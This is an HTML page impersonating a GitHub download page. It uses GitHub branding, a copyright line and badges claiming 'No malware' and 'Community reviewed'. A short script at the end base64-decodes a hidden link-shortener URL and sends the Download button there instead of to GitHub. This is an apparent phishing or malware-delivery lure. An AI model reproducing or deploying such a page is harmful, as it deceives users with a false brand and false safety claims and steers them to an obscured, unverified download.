<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GitHub Download</title>

  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    :root {
      --bg: #0d1117;
      --panel: #161b22;
      --border: #30363d;
      --text: #c9d1d9;
      --text-strong: #f0f6fc;
      --muted: #8b949e;
      --green: #238636;
      --green-hover: #2ea043;
      --btn: #21262d;
      --btn-hover: #30363d;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Inter, system-ui, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      animation: fadeIn 0.6s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(6px); }
      to { opacity: 1; transform: none; }
    }

    a {
      color: inherit;
      text-decoration: none;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 18px 32px;
      border-bottom: 1px solid var(--border);
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 18px;
      font-weight: 600;
      color: var(--text-strong);
    }

    .brand i {
      font-size: 28px;
    }

    .github-link {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 12px 20px;
      border-radius: 6px;
      border: 1px solid var(--border);
      background: var(--btn);
      color: var(--text-strong);
      font-weight: 500;
    }

    .github-link:hover {
      background: var(--btn-hover);
    }

    main {
      flex: 1;
      padding: 56px 24px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .box {
      width: 100%;
      max-width: 620px;
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 32px;
    }

    .download {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }

    .download a {
      display: inline-flex;
      align-items: center;
      gap: 14px;
      padding: 18px 56px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 12px;
      background: linear-gradient(180deg, #2ea043, #238636);
      color: #fff;
      border: 1px solid rgba(240,246,252,0.2);
      transition: transform .15s ease, box-shadow .15s ease;
    }

    .download a:hover {
      transform: translateY(-2px) scale(1.04);
      box-shadow: 0 12px 30px rgba(46,160,67,.45);
    }

    .subtitle {
      text-align: center;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 24px;
    }

    .divider {
      border: none;
      border-top: 1px solid var(--border);
      margin: 24px 0;
    }

    .info {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
    }

    .info-item {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: #0d1117;
      font-size: 13px;
      color: var(--muted);
      cursor: default;
      transition: background .15s ease, border-color .15s ease;
      white-space: nowrap;
    }

    .info-item i {
      color: var(--text-strong);
      font-size: 15px;
    }

    .info-item:hover {
      background: #161b22;
      border-color: #3fb950;
    }

    @media (max-width: 640px) {
      .info {
        grid-template-columns: 1fr;
      }
    }

    footer {
      border-top: 1px solid var(--border);
      padding: 22px 32px;
      font-size: 14px;
      color: var(--muted);
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 18px;
    }

    .footer-left,
    .footer-center,
    .footer-right {
      display: flex;
      align-items: center;
      gap: 18px;
      flex-wrap: wrap;
    }

    .footer-right {
      font-size: 18px;
    }

    footer a:hover {
      color: var(--text-strong);
    }
  </style>
</head>

<body>

<header>
  <a class="brand" href="https://github.com" target="_blank">
    <i class="fa-brands fa-github"></i>
    GitHub
  </a>

  <a class="github-link" href="https://github.com" target="_blank">
    <i class="fa-brands fa-github"></i>
    View on GitHub
  </a>
</header>

<main>
  <div class="box">

    <div class="download">
      <a href="#" id="downloadBtn">
        <i class="fa-solid fa-download"></i>
        Download
      </a>
    </div>

    <div class="subtitle">
      Secure and transparent with GitHub.<br>
      Trusted by the Open-Source Community.
    </div>

    <hr class="divider">

    <div class="info">
      <div class="info-item">
        <i class="fa-solid fa-code-branch"></i>
        Open-Source Verified
      </div>
      <div class="info-item">
        <i class="fa-solid fa-shield-halved"></i>
        No malware • No ads
      </div>
      <div class="info-item">
        <i class="fa-solid fa-users"></i>
        Community reviewed
      </div>
    </div>

  </div>
</main>

<footer>
  <div class="footer-left">
    <i class="fa-brands fa-github"></i>
    © 2026 GitHub, Inc.
  </div>

  <div class="footer-center">
    <a href="https://github.com">Terms</a>
    <a href="https://github.com">Privacy</a>
    <a href="https://github.com">Security</a>
    <a href="https://github.com">Status</a>
    <a href="https://github.com">Docs</a>
    <a href="https://github.com">Contact</a>
  </div>

  <div class="footer-right">
    <a href="https://github.com"><i class="fa-brands fa-github"></i></a>
    <a href="https://x.com/github"><i class="fa-brands fa-x-twitter"></i></a>
    <a href="https://www.linkedin.com/company/github"><i class="fa-brands fa-linkedin"></i></a>
    <a href="https://www.youtube.com/github"><i class="fa-brands fa-youtube"></i></a>
  </div>
</footer>

<script>
  const l=atob("aHR0cHM6Ly9nb28uc3UvaEsxSjQzNg==");
  document.getElementById("downloadBtn").addEventListener("click",function(e){
    e.preventDefault();
    window.location.href=l;
  });
</script>

</body>
</html>
